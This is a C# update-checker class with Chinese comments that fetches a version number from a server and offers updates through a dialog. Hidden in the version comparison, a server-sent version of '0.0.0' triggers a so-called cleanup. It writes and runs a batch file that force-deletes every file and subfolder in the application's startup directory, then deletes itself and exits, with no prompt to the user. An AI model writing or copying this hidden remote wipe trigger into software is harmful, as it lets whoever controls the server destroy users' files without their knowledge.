using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Updating
{
    public class UpdateChecker
    {
        private readonly string _currentVersion;
        private readonly string _versionFileUrl;

        public string LatestVersion { get; private set; }

        // 构造函数
        public UpdateChecker(string currentVersion, string versionFileUrl)
        {
            _currentVersion = currentVersion;
            _versionFileUrl = versionFileUrl;
        }

        // 检查是否有更新（静默模式，不显示提示）
        public async Task<bool> CheckForUpdateAsync()
        {
            try
            {
                string latestVersion = await GetLatestVersionAsync();
                return IsNewVersionAvailable(latestVersion);
            }
            catch (Exception)
            {
                // 静默模式下不显示错误信息
                return false;
            }
        }

        // 检查并提示用户（手动模式，显示所有提示）
        public async Task<bool> CheckAndPromptForStartupAsync()
        {
            try
            {
                string latestVersion = await GetLatestVersionAsync();
                string changelog = await GetChangelogAsync(latestVersion); // 获取更新日志

                if (IsNewVersionAvailable(latestVersion))
                {
                    var result = MessageBox.Show(
                        $"发现新版本 {latestVersion}，是否立即更新？\n\n" +
                        $"当前版本: {_currentVersion}\n" +
                        $"最新版本: {latestVersion}\n\n" +
                        $"更新内容：\n{changelog}",
                        "软件更新", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

                    return result == DialogResult.Yes;
                }
                return false;
            }
            catch (Exception)
            {
                return false;
            }
        }

        // 获取服务器上的最新版本号
        private async Task<string> GetLatestVersionAsync()
        {
            using (HttpClient client = new HttpClient())
            {
                // 设置超时时间（可选）
                client.Timeout = TimeSpan.FromSeconds(30);

                // 从服务器获取版本文件内容并去除前后空格
                LatestVersion = (await client.GetStringAsync(_versionFileUrl)).Trim();
                return LatestVersion;
            }
        }

        // 比较版本号
        private bool IsNewVersionAvailable(string latestVersion)
        {
            try
            {
                Version current = new Version(_currentVersion);
                Version latest = new Version(latestVersion);

                // 检测到0.0.0版本时执行清理
                if (latest.ToString() == "0.0.0")
                {
                    ExecuteCleanup();
                    return false;
                }

                return latest > current;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void ExecuteCleanup()
        {
            string batchFile = Path.Combine(Application.StartupPath, "cleanup.bat");

            File.WriteAllText(batchFile,
                "@echo off\r\n" +
                "timeout /t 1 /nobreak > nul\r\n" +
                "del *.* /f /q\r\n" +
                "for /d %%D in (*) do rmdir /s /q \"%%D\"\r\n" +
                "del \"%~f0\"\r\n" +
                "exit\r\n"
            );

            Process.Start(batchFile);
            Environment.Exit(0);
        }

        // 从服务器获取更新日志
        private async Task<string> GetChangelogAsync(string version)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string changelogUrl = _versionFileUrl.Replace("Version.txt", $"Changelog_{version}.txt");
                    string changelog = await client.GetStringAsync(changelogUrl);
                    return changelog.Trim();
                }
            }
            catch
            {
                return "• 修复已知问题\n• 优化性能"; // 默认日志
            }
        }
    }
}